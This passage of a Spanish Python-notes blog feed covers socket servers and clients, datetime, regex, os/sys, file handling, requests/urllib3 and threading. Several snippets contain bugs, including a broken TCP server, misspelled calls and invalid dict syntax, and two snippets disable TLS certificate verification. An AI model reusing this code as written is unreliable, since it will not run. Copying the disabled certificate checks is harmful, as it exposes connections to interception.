comunicaciones en red. Permite a los desarrolladores crear aplicaciones que pueden enviar y recibir datos a través de la red, ya sea en una red local o a través de Internet. Aquí tienes una visión general de la librería ‘socket‘:<br>
<br>Creación de sockets: La librería ‘socket‘ proporciona clases y funciones para crear sockets, que son puntos finales de comunicación. Puedes crear sockets tanto para el protocolo TCP (Transmission Control Protocol) como para UDP (User Datagram Protocol).
<br>Conexiones TCP: Puedes utilizar ‘socket‘ para establecer conexiones TCP, que son conexiones confiables y orientadas a la conexión. Esto es útil para aplicaciones que requieren transferencia de datos confiable, como la transmisión de archivos o la comunicación cliente-servidor.
<br>Comunicación UDP: La librería ‘socket‘ también admite la comunicación mediante UDP, que es un protocolo de envío de mensajes sin conexión. Es adecuado para aplicaciones que necesitan una comunicación rápida y eficiente, como juegos en línea o aplicaciones de transmisión de video en tiempo real.
<br>Funciones de envío y recepción: Puedes utilizar métodos como ‘send()‘ y ‘recv()‘ para enviar y recibir datos a través de sockets. Esto te permite transferir información entre dispositivos de manera eficiente.
<br>Gestión de conexiones: La librería ‘socket‘ incluye métodos como ‘bind()‘ para asociar un socket a una dirección y puerto específicos, y ‘listen()‘ para poner un socket en modo de escucha, lo que le permite aceptar conexiones entrantes.
<br>Conexiones cliente-servidor: Con ‘socket‘, puedes crear aplicaciones cliente-servidor, donde un programa actúa como servidor esperando conexiones entrantes y otro actúa como cliente para conectarse al servidor.
<br>Ejemplo server en python con IPv4 y TCP:<br>#!/usr/bin/python3
import socket, signal, sys

# Ctrl + C

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n")
	server.close()
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global Vars

HOST = '127.0.0.1'
PORT = 4343

# Main Chat

def start_chat_server(conn):

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		conn.bind((HOST, PORT))
		conn.listen(1)
		print(f"\n\t[+] Server listening on {HOST}:{PORT}")
		client, addr = conn.accept()
		print(f"\n\t[i] New client connected: {addr[0]}:{addr[1]}")

		while True:
			message = client.recv(1024).decode().strip()
			print(f"\n{addr[0]}:{addr[1]} --&gt; {message}")
			message_to_send = input("\nMessage to send: ")
			client.send(message_to_send.encode('utf-8'))


if __name__ == "__main__":
	start_chat_server(server)
Copy<br>Ejemplo cliente en python con IPv4 y TCP: <br>#!/usr/bin/python3
import signal, socket, sys

# Ctrl + c

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Connect to server (Client)

def connect_to_chat(host, port):

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
		server.connect((host, port))
		print(f"\n\t[!] Connected to {host}:{port}.")

		while True:
			message_to_send = input("\nMessage to send: ")
			server.send(message_to_send.encode('utf-8'))
			message = server.recv(1024).decode().strip()
			print(f"\nServer --&gt; {message}")


if __name__ == "__main__":
	if len(sys.argv) == 3:
		host, port = sys.argv[1], int(sys.argv[2])
		connect_to_chat(host, port)
	else:
		print("\n\n\t[!] Execution: python3 %s {host} {port}\n\n" % sys.argv[0])
		sys.exit(1)
Copy<br>Ejemplo server en python con IPv4 y UDP:<br>import socket, signal, sys

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# UPD Server

def start_udp_server():

	host = "localhost"
	port = 1234

	# UDP
	with socket.socket(socket.AF_INET, socket.sock_DGRAM) as server:
		server.bind((host, port))
		pirnt(f"\n\t[i] Server listenning on: {host}:{port} (UDP)")

		while True:
			data, addr = server.recvfrom(1024)
			print(f"\n\t[i] Message recived:\n{data.decode()}")
			print(f"\n\n\t[i] Client information:\n\t+ IP: {addr[0]}\n+ HOST: {addr[1]}")

if __name__ == "__main__":
	start_udp_server()
Copy<br>Ejemplo cliente en python con IPv4 y UDP:<br>import socket, signal, sys

# Ctrl C

def ctrl_c(sig, frame):
	print("\n\n\t[!] Quiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Server

def start_udp_client():

	host = "localhost"
	port = 4343

	with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server:
		message = "Message to send".encode("utf-8")
		server.sendto(message, (host, port))

if __name__ == "__main__":
	start_udp_client()
Copy<br>En estos ejemplos, estamos montando servidores y clientes por IPv4 haciendo uso de los protocolos TCP y UDP, pero algo a tener en cuenta es que existe una cola de espera a la hora de llevar a cabo estas conexiones, es decir, si el servidor esta en escucha y 4 clientes se conectan de manera simultanea, 3 clientes quedaran en espera mientras el servidor establece conexión con el primer cliente, para poder permitir múltiples conexiones podemos hacer uso de hilos, con la librería threading.<br><br><br>La función ‘setsockopt‘ en la programación de redes juega un papel crucial al permitir a los desarrolladores ajustar y controlar varios aspectos de los sockets. Los sockets son fundamentales en la comunicación de red, proporcionando un punto final para el envío y recepción de datos en una red.<br><br>Cuando utilizas ‘setsockopt’, puedes especificar diferentes niveles de configuración, que determinan el ámbito y la aplicación de las opciones que estableces:<br>
<br>Nivel de Socket (SOL_SOCKET): Este nivel afecta a las opciones aplicables a todos los tipos de sockets, independientemente del protocolo que estén utilizando. Las opciones en este nivel controlan aspectos generales del comportamiento del socket, como el tiempo de espera, el tamaño del buffer, y el reuso de direcciones y puertos.
<br>Nivel de Protocolo: Este nivel permite configurar opciones específicas para un protocolo de red en particular, como TCP o UDP. Por ejemplo, puedes ajustar opciones relacionadas con la calidad del servicio, la forma en que se manejan los paquetes de datos, o características específicas de un protocolo.
<br><br>‘socket.SOL_SOCKET‘ es una constante en muchos lenguajes de programación que se usa con ‘setsockopt’ para indicar que las opciones que se van a ajustar son a nivel de socket. Esto significa que las opciones aplicadas en este nivel afectarán a todas las operaciones de red realizadas a través del socket, sin importar el protocolo de transporte específico (como TCP o UDP) que esté utilizando.<br><br>‘socket.SO_REUSEADDR‘ es otra opción comúnmente utilizada en setsockopt. Esta opción es muy útil en el desarrollo de aplicaciones de red. Lo que hace es permitir que un socket se enlace a un puerto que todavía está siendo utilizado por un socket que ya no está activo. Esto es particularmente útil en situaciones donde un servidor se reinicia y sus sockets aún están en un estado de “espera de cierre” (TIME_WAIT), lo que podría impedir que el servidor se vuelva a enlazar al mismo puerto.<br>Al establecer ‘SO_REUSEADDR‘, el sistema operativo permite reutilizar el puerto inmediatamente, lo que facilita la reanudación rápida de los servicios del servidor.<br>En resumen, ‘setsockopt‘ con diferentes niveles y opciones, como ‘SOL_SOCKET‘ y ‘SO_REUSEADDR‘, proporciona una flexibilidad significativa en la configuración de sockets para una comunicación de red eficiente y efectiva.<br>Ejemplo de servidor que acepta múltiples conexiones y usa socket.setsockopt:<br>import socket, threading

class ClientThread(threading.Thread):
	def __init__(self, client, addr):
		super().__init__()
		self.client = client
		self.addr = addr

		print(f"\n[i] New client: {addr[0]}:{addr[1]}")

	def run(self):
		message = ""
		while True:
			message = self.client.recv(1024).decode()
			print(message)
			if message.strip() == "bye":
				break

			print(f"\n[+] Message recived from {self.addr[0]}:{self.addr[1]}: {message}")
			self.client.send(message.encode())

		print(f"\n\t[!] Client {self.addr[0]}:{self.addr[1]} disconected\n")
		self.client.close()

HOST = "localhost"
PORT = 4343

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # TIME_WAIT
	server.bind((HOST, PORT))

	print(f"\n[+] Listenning on {HOST}:{PORT}")

	while True:
		server.listen()
		client, addr = server.accept()
		new_thread = ClientThread(client, addr)
		new_thread.start()
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/conexiones-de-red-y-protocolos.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Conexiones de red y protocolos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 04 Jun 2024 18:45:36 GMT</pubDate></item><item><title><![CDATA[Date-Time]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>La biblioteca datetime en Python es una de las principales herramientas para trabajar con fechas y horas. <br>
<br>Los tipos de datos principales: datetime incluye varios tipos de datos, como date (Para fechas), time (Para horas), datetime (Para fechas y horas combinadas) y timedelta (Para representar diferencias de tiempo).
<br>Manipulación de fechas y horas: Permite realizar operaciones como suamr o restar días, semanas, o meses a una fecha, comparar fechas, o extraer componenetes como el día, mes, o año de una fecha específica.
<br>Zonas Horarias: A través del módulo pytz que se integra con datetime, se pueden manejar fechas y horas en diferentes zonas horarias, lo que es crucial para aplicaciones que requieren precisión a nivel global.
<br>Formateo y análisis: Datetime permite convertir fechas y horas a srtings y viceversa, utilizando códigos de formato específicos. Esto es útil para mostrar fechas y horas en formatos legibles o para parsear strings que representan fechas/horas.
<br>Facilidad de Uso: A pesar de su potencia y flexibilidad, datetime es relativamente fácil de usar, lo que la hace accesible incluso para programadores principiantes.
<br>Amplia aplicación: Desde registros de eventos hasta cálculos de períodos de tiempo, datetime es indispensable en una variedad de aplicaciones, como sistemas de reservas, análisis de datos temporales, y más.
<br>import datetime 

# Get actual time 
now = datetime.datetime.now()
year = now.year
month = now.month
day = now.day
hour = now.hour
minutes = now.minute
seconds = now.second

# Create a date
my_date = datetime.date(2023, 12, 12)

# Create a time 
my_time = datetime.time(14, 59, 4)

# Create a datetime
my_datetime = datetime.datetime(2023, 6, 12, 14, 59, 4)


Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/date-time.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Date-Time.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 12 Dec 2023 15:40:50 GMT</pubDate></item><item><title><![CDATA[Expresiones regulares]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>Una expresión regular es una secuencia de caracteres que conforman un patrón de búsqueda. Se utilizan principalmente para la búsqueda de patrones de cadenas de caracteres u operaciones de sustituciones.<br><br><br>La librería re en Python proporciona un conjunto completo de herramientas para trabajar con expresiones regulares, que son patrones de cadenas diseñados para la búsqueda y manipulación de texto.<br>
<br>Funciones básicas: re incluye funciones como search (Para buscar un patrón dentro de una cadena), match (Para verificar si una cadena comienza con un patrón específico), findall (Para encontrar todas las ocurrencias de un patrón), y sub (Para reemplazar partes de una cadena que coinciden con un patrón).
<br>Compilación de Patrones: Permite compilar expresiones regualres en obhjetos de patrón, lo que puede mejorar el rendimiento cuando se usan repetidamente.
<br>Grupos y captura: Ofrece la capacidad de definir grupos dentro de patrones de expresiones regulares, lo que facilita extraer partes específicas de una cadena que coinciden con subpatrones.
<br>Flags: Soporta modificadores que alteran la forma en que las expresiones regualres son interpretadas y coincididas, como ignorar mayúsculas y minúsuculas o permitir el modo multilínea.
<br>Patrones complejos: Permite la creación de patrones complejos utilizando uan variedad de símbolos y secuencias especiales, como cuantificadores, aserciones y clases de caracteres.
<br>Aplicaciones prácticias: Las expresiones regualres son extremadamente útiles en tareas como la validación de formatos (Por ejemplo, direcciones de correo electrónico), el análisis de registros (Logs), el procesamiento de lenguaje natural, y la limpieza y preparación de datos.
<br>Curva de aprendizaje: Aunque potentes, las expresiones regulares pueden ser complejas y requieren una cueva de aprendizaje. Sin embargo, una vez dominadas, se convierten en una herramienta invaluable en el arsenal de cualquier programador. 
<br>import re 

text = "This is an example test for test regex"
text2 = "This is another example. Today is 13/12/2023 and tomorrow will be 14/12/2023"
text3 = "The users can be contact with us to dobliuw@dobliuw.com or dobliuw@gmail.com"
text4 = "Field1,Field2,Field3,Field4,Field5"
text5 = "car , cart, masticart, magicarp"

test_matches = re.findall("test", text) # ['test', 'test']
dates_matches = re.findall("\d{2}\/\d{2}\/\d{4}", text2) # ['13/12/2023', '14/12/2023']
mails_groups_matches = re.findall("(\w+)@(\w+\.\w{2,})", text3) # [('dobliuw','dobliuw.com'), ('dobliuw', 'gmail.com')]
fields_matches = re.split(',', text4) # ["Field1", "Field2", "Field3", "Field4", "Field5"]
re.sub("test", "dobliuw", text) # This is an example dobliuw for dobliuw regex
re.findall(r"\bcar", text5 ) # Que empieze con car
re.findall(r"car\b", text5 ) # Que finalize con car
re.findall(r"\bcar\b", text5 ) # Que sea car 

def validate_mail(mail):
	return "Mail valid." if re.findall("[A-Za-z0-9._+-]+@[A-Za-z0-9]+\.\w{2,}", mail) else "Mail invalid."

for match in re.finditer("\d{2}\/\d{2}\/\d{4}", text2):
	print(f"La fecha {match.group(0)} empieza en la posición {match.start()} y finaliza en la posición {match.end()}")

Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/expresiones-regulares.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Expresiones regulares.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 13 Dec 2023 15:03:10 GMT</pubDate></item><item><title><![CDATA[Librerías OS y SYS]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>Las bibliotecas os y sys de Python son herramientas esenciales para cualqier desarrollador que busque interactuar eficazmente con el sistema operativo y gestionar el entorno de ejecucción de sus porgramas. estas bibliutoecas proporcionan una ampia gama de funcinalidaddes que permiten una mayor flexibilidad y control en el desarrollo de software.<br><br><br>La biblioteca os en Python es una herramienta poderosa para interactuar con el sistema operatvio. Proporciona una interfaz portátil para usar funcionalidades del sistema operativo, lo que significa que los programas pueden funcionar en diferentes sistemas operativos sin cambios significativos en el código. Algunas de sus capacidades incluyen:<br>
<br>Manipulación de Archivos y Directorios: Permite realizar operaciones como crear, eliminar, mover archivos y directorios, y consultar sus propiedades.
<br>Ejecución de Comandos del Sistema: Facilita la ejecución de comandos del sistema operativo desde un programa Python.
<br>Gestión de Variables de Entorno: Ofrece funciones para leer y modificar las variables de entorno del sistema.
<br>Obtención de Información del Sistema: Proporciona métodos para obtener información relevante sobre el sistema operativo, como la estructura de directorios, detalles del usuario, procesos, etc.
<br>Ejemplos:<br>import os 

os.getcwd() # pwd 
os.listdir('/path/') # ls 
os.mkdir('name') # mkdir name 
os.path.exists('file') # True | False
os.getevn('PATH') # echo $PATH
Copy<br><br><br>la biblioteca sys en Python es fundamental para interactuar con el entorno de ejecución del programa Python. A difererencia de os, que se centra en el sistema operativo, sys está más roientada a la interacción con el intérprete de Python. Sus principales usos son: <br>
<br>Argumentos de Línea de Comandos: Permite acceder y manipular los argumentos que se pasan al programa Python desde la línea de comandos.
<br>Gestión de la Salida del Programa: Facilita el control sobre la salida estándar (stdout) y la salida de error (stderr), lo cual es esencial para la depuración y la presentación de resultados.
<br>Información del Intérprete: Ofrece acceso a configuraciones y funcionalidades relacionadas con el intérprete de Python, como la versión de Python en uso, la lista de módulos importados y la gestión de la ruta de búsqueda de módulos.
<br>Ejemplos<br>import sys

sys.exit(0)
sys.argv[0] # Script name 
len(sys.argv)
sys.path
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/librería-os-y-sys.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Librería OS y SYS.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 18 Dec 2023 22:11:50 GMT</pubDate></item><item><title><![CDATA[Manejo de archivos y directorios]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>La librería os y el módulo shutil en Python son herramientas fundamentales para intercatuar con el sistema de archivos, especialmente en lo que resepcta a la creación y eliminación de archivos y directorios.<br><br><br>
<br>Funcionalidades Básicas: OS  proporciona una interfaz rica y cvariada para interactuar con el sistema operativo subyacente. Permite realizar operaiones como la creación y eliminación de archivos y directorios, así como la manipulación de rutas y el manejo de la información del sistema de archivos.
<br><br>
<br>Creación de directorios: Utilizando os.mkdir() u os.makedirs(), se pueden crear directorios individuales o múltiplies.
<br>Eliminación: os.remove() se usa para eliminar archivos, mientras que os.rmdir() y os.removedirs permiten eliminar directorios y directorios con subdirectorios, respectivamente.
<br>Gestión de rutas: La sublibrería os.path es crucial para manipular rutas de archivos y directorios, como unir rutas, obtener nombres de archivos, verficicar si un archivo o directorio existe, etc.
<br>import os 

os.path.exists("file") # Search a file in actual dir
os.mkdir("dobliuw") # Create dobliuw directory
os.makedirs("dobliuw_a/dobliuw_b") # Create dobluw_a directory with dobliuw_b subdirectory 
os.listdir() # [dobliuw, dobliuw_a]
os.remove("file.txt") # Remove a file 
os.rmdir("dobliuw") # Remove a empty dir 
os.rename("file", "file_edited") # Change a name
os.path.getsize("/etc/passwd") # Get a file size 
os.path.join("mi_dir", "mi_file.txt") # mi_dir/mi_file.txt
os.path.basename("/etc/hosts") # Hosts
os.path.dirname("/etc/hosts") # /etc
directory, file = os.path.split("/etc/hosts") # /etc , hostss
Copy<br><br><br>
<br>Operaciones de alto nivel: Mientras que os se enfoca en operaciones básicas, shutil porporciona funciones de nivel superior, más orientadas a tareas complejas y operaciones en lotes.
<br>Copiar y Mover arhcivos y directorios: SHUTIL es especialmente útil para copiar y mover archivos y directorios. Funciones como shutil.copy(), shutil.copytree() y shutil.move() facilitan estas tareas.
<br>Eliminación de directorios: Aunque os puede eliminar directorios, shutil.rmtree() es una herramienta más poderosa para eliminar un directorio completo y todo su contenido.
<br>Manejo de archivos temporales: shutil también ofreffce funcionalidades para trabajar con archivos temporales, lo que es útil para operaciones que requieren almacenamiento temporal de datos.
<br>import shutil

shutil.rmtree("directory") # Remove all files and dirs 
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/manejo-de-archivos-y-directorios.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Manejo de archivos y directorios.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 13 Dec 2023 22:53:49 GMT</pubDate></item><item><title><![CDATA[Requests y URLlib3]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>La biblioteca requests en Python es una de las herramientas más populares y poderosas para realizar solicitudes HTTP. Su diseño es intuitivo y fácil de usar, lo que la hace una opción preferida para interactuiar con APIs y servicios web.<br><br>
<br>Simplicidad y Facilidad de Uso: Con requests, enviar solicitudes GET, POST, PUT, DELETE, entre otras, se puede realizar en pocas líneas de código. Su sintaxis es clara y concisa.
<br>Gestión de Parámetros URL: Permite manejar parámetros de consulta y cuerpos de solicitud con facilidad, automatizando la codificación de URL.
<br>Manejo de Respuestas: ‘requests‘ facilita la interpretación de respuestas HTTP, proporcionando un objeto de respuesta que incluye el contenido, el estado, los encabezados, y más.
<br>Soporte para Autenticaciones: Ofrece soporte integrado para diferentes formas de autenticación, incluyendo autenticación básica, digest, y OAuth.
<br>Manejo de Sesiones y Cookies: Permite mantener sesiones y gestionar cookies, lo cual es útil para interactuar con sitios web que requieren autenticación o mantienen estado.
<br>Soporte para SSL: ‘requests‘ maneja SSL (Secure Sockets Layer) y TLS (Transport Layer Security), permitiendo realizar solicitudes seguras a sitios HTTPS.
<br>Manejo de Excepciones y Errores: Proporciona métodos para manejar y reportar errores de red y HTTP de manera efectiva.
<br><br><br>La biblioteca se utiliza ampliamente para interactucar con APIs RESTful, automatizar interacciones con sitios web, y en tareas de scraping web. Sus capacidades para manejar solicitudes complejas y sus características de seguridad la hacen ideal para un amplia gama de aplicaciones, desde scripts simles hasta sistemas empresariales complejos.<br>Ejemplos:<br>import requests

# Default get
response = requests.get("url")

# Status code
print(response.status_code)

# Font code
print(response.text)

# Authentication
requests.get('url', auth=('user', 'pass'))

# Giving params
params_dict = {'key1': 'value1', 'key2', 'value2'}
new_response = requests.get("url", params=params_dict)

# Giving payload
payload_dict = {'key1': 'value1', 'key2', 'value2'}
new_response_2 = requests.post("url", data=payload_dict)

# Modifying headers
header = {'User-Agent': 'Mozilla 3.0 dobliuw gvng'}
new_response_3 = resquests.get("url", headers=header)
print(new_response_3.request.header)

# Modifying cookies
cookies = dict(token="dobliuwcookie") # {"token": "dobliuwcookie"}
requests.get("url", cookies=cookies)

# Sending files
file_to_upload = {"file": open("my_file", "r")}
requests.post("url", files=file_to_upload)

# Track all urls
track_response = requests.get("url")
print(track_response.history)

# Block redirects
requests.get("url", allow_redirects=False)

# Disable auto signed SSL Certificates error (https)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
requests.get("url", verify=False)

# Handling exceptions
try:
	new_response_4 = requests.get('url', timeout=1)
	new_response_4.raise_for_status()
	
except requests.Timeout: # Handle timeout
	print("The website did not response.")
	
except requests.HTTPError: # Handle HTTP error
	print("The website has an error.")

except requests.RequestException: # Handle all requests exceptions
	print("An error ocurred")

Copy<br>Ahora, en caso de tener que tramitar múltiples peticiones para poder ejecutar lo que nos interesa, supongamos que debemos loguearnos en un panel para posteriormente dirigirnos a un apartado de la url y realizar la acción final, podríamos jugar con sesiones, de esta manera declarariamos lo siguiente:<br>import requests

s = requests.session()
response = s.get("url")
s.verify = False 

############################
import requests

with requests.Session() as s:
	s.auth = ("user", "pass")
	response1 = s.get("url")
	response2 = s.get("url2")

Copy<br>De manera que una vez tengamos la sessión declarada en una variable, en este caso la variable s, podríamos hacer uso de esta session para tramitar todas las peticiones que nos interese tramitar. <br><br><br>La biblioteca urllib3 de Python es ampliamente utilizada para realizar solicutides HTTP y HTTPS. Es conocida por su robustez y sus numerosas características, que la hacen una herrmaienta versátil para una variedad de aplicaciones de red. A continuación, se presenta una descripción detallada de urllib3 y sus capacidades.<br>
<br>Gestión de Pool de Conexiones: Una de las características más destacadas de ‘urllib3‘ es su manejo de pools de conexiones, lo que permite reutilizar y mantener conexiones abiertas. Esto es eficiente en términos de rendimiento, especialmente cuando se hacen múltiples solicitudes al mismo host.
<br>Soporte para Solicitudes HTTP y HTTPS: ‘urllib3‘ ofrece un soporte sólido para realizar solicitudes tanto HTTP como HTTPS, brindando la flexibilidad necesaria para trabajar con una variedad de servicios web.
<br>Reintentos Automáticos y Redirecciones: Viene con un sistema incorporado para manejar reintentos automáticos y redirecciones, lo cual es esencial para mantener la robustez de las aplicaciones en entornos de red inestables.
<br>Manejo de Diferentes Tipos de Autenticación: Proporciona soporte para varios esquemas de autenticación, incluyendo la autenticación básica y digest, lo que la hace apta para interactuar con una amplia gama de APIs y servicios web.
<br>Soporte para Características Avanzadas del HTTP: Incluye soporte para características como la compresión de contenido, el streaming de solicitudes y respuestas, y la manipulación de cookies, ofreciendo así un control detallado sobre las operaciones de red.
<br>Gestión de SSL/TLS: ‘urllib3‘ tiene capacidades avanzadas para manejar la seguridad SSL/TLS, incluyendo la posibilidad de trabajar con certificados personalizados y la verificación de la conexión segura.
<br>Tratamiento de Excepciones y Errores: La biblioteca maneja de manera eficiente las excepciones y errores, permitiendo a los desarrolladores gestionar situaciones como tiempos de espera, conexiones fallidas y errores de protocolo.
<br><br><br>Esta librería se utiliza en una variedad de contextos, desde scraping web y automatización de tareas, hasta la construcción de clientes para interactucar conAPIs complejas. Su capacidad para manejar conexiones de manera eficiente y segura la hace adecuada para aplicaciones que requieren un alto grado de interacción de red, así como para escenarios donde el rendimiento y la fiabilidad son cruciales.<br>Ejemplos: <br>import urllib3

http = urllib3.PoolManager() # Controlador de conexiones

response = http.request('GET', 'url')
print(response.data) # Respuesta en formato bytes
print(response.data.decode())

# Send encoded data in body
encoded_data = json.dumps({'atributo': 'valor'}).encode()
http.request('GET', 'url', body=encoded_data)

# Send un-encoded data in body
http.request('GET', 'url', fields={'atributo':'valor'})

# Modifying headers
http.request('POST', 'url', headers={'Content-Type': 'application/json'})

# Modifying redirects
http.request('GET', 'url', redirect=False)

# Track redirects 
new_response = http.request('POST', 'url', redirect=False)
print(new_response.get_redirect_location()) # New tryin redirect url

# Disable auto signed SSL Certificates error (https)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
http = urlib3.PoolManager(cert_reqs='CERT_NONE')
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/python/modules/requests-y-urllib3.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Python/Modules/Requests y URLlib3.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 18 Dec 2023 23:53:48 GMT</pubDate></item><item><title><![CDATA[Bibliotecas <strong>threading</strong> y <strong>multiprocessing</strong>]]></title><description><![CDATA[ 
 <br><br>Las biblitoecas threading y multiprocessing en Python son herramientas esenciales para la programación concurrente y paralela. Proporcionan mecanismos para ejecutar múltiples tareas simultáneamente, aprovechando mejor los recursos del sistema. <br><br>Threading es una biblioteca para la programación concurrente que permite a los programas ejecutar múltiples hilos de ejecución al mismo tiempo. Los hilos son entidades más ligeras que los procesos, comparten el mismo espacio de memoria y son ideales para tareas que requieren poco procesamiento o que están limitadas por E/S.<br>
<br>Uso Principal: Ideal para tareas que no son intensivas en CPU o que esperan recursos (como E/S de red o de archivos).
<br>Ventajas: Bajo costo de creación y cambio de contexto, compartición eficiente de memoria y recursos entre hilos.
<br>Desventajas: Limitada por el Global Interpreter Lock (GIL) en CPython, que previene la ejecución de múltiples hilos de Python al mismo tiempo en un solo proceso.
<br>Ejemplo:<br>import requests, threading, time

domains = ["https://google.es", "https://wikipedia.org", "https://instagram.com", "https://facebook.com", "https://yahoo.com"]

def wget_without_threads():
	start_time = time.time()

	for url in domains:
		response = requests.get(url)
		print(f"\n[+] DOMAIN [{url}]: {len(response.content)} bytes.")

	end_time = time.time()
	print(f"\n\t[i] Time transcurred: {round(end_time - start_time,2)} s")


def make_wget(url):
	response = requests.get(url)
	print(f"\n[+] DOMAIN [{url}]: {len(response.content)} bytes.")


def wget_with_threads():
	start_time = time.time()

	threads = []
	for url in domains:
		thread = threading.Thread(target=make_wget, args=(url,))
		thread.start()

		threads.append(thread)

	for thread in threads:
		thread.join()

	end_time = time.time()
	print(f"\n\t[i] Time transcurred: {round(end_time - start_time,2)} s\n\n")


if __name__ == "__main__":
	print("\n\t[i] Initializing wgets without threads:")
	wget_without_threads()
	print("\n\t[i] Initializing wgets with threads:")
	wget_with_threads()
Copy<br>Tras ejecutar este script podremos comparar en tiempo real como se realizan las peticiones, sin hilos se realizan de manera consecutiva mientras que haciendo uso de estos se realizan de forma simultanea, arrojando como resultado: <br><img alt="threading_python.png" src="https://dobliuw.com/lib/media/threading_python.png"><br><br>Multiprocessing, por otro lado, se enfoca en la creación de procesos. Cada proceso en multprocessing tiene su propio espacio de memoria. Esto significa que pueden ejecutarse en paralelo real en sistemas con múltiples núcleos de CPU, superando la limitación del GIL.<br>
<br>Uso Principal: Ideal para tareas intensivas en CPU que requieren paralelismo real.
<br>Ventajas: Capacidad para realizar cálculos intensivos en paralelo, aprovechando múltiples núcleos de CPU.
<br>Desventajas: Mayor costo en recursos y complejidad en la comunicación entre procesos debido a espacios de memoria separados.
<br><br>
<br>Modelo de Ejecución: ‘threading‘ ejecuta hilos en un solo proceso compartiendo el mismo espacio de memoria, mientras ‘multiprocessing‘ ejecuta múltiples procesos con memoria independiente.
<br>Uso de CPU: ‘multiprocessing‘ es más adecuado para tareas que requieren mucho cálculo y pueden beneficiarse de múltiples núcleos de CPU, mientras que ‘threading‘ es mejor para tareas limitadas por E/S.
<br>Global Interpreter Lock (GIL): ‘threading‘ está limitado por el GIL en CPython, lo que restringe la ejecución en paralelo de hilos, mientras que ‘multiprocessing‘ no tiene esta limitación.
<br>Gestión de Recursos: ‘threading‘ es más eficiente en términos de memoria y creación de hilos, pero ‘multiprocessing‘ es más eficaz para tareas aisladas y seguras en cuanto a datos.
<br>Ejemplo:<br>import requests, time, multiprocessing

domains = ["https://google.es", "https://wikipedia.org", "https://instagram.com", "https://facebook.com", "https://yahoo.com"]

def wget_without_processes():
	start_time = time.time()

	for url in domains:
		response = requests.get(url)
		print(f"\n[+] DOMAIN [{url}]: {len(response.content)} bytes.")

	end_time = time.time()
	print(f"\n\t[i] Time transcurred: {round(end_time - start_time,2)} s")


def make_wget(url):
	response = requests.get(url)
	print(f"\n[+] DOMAIN [{url}]: {len(response.content)} bytes.")


def wget_with_processes():
	start_time = time.time()

	processes = []
	for url in domains:
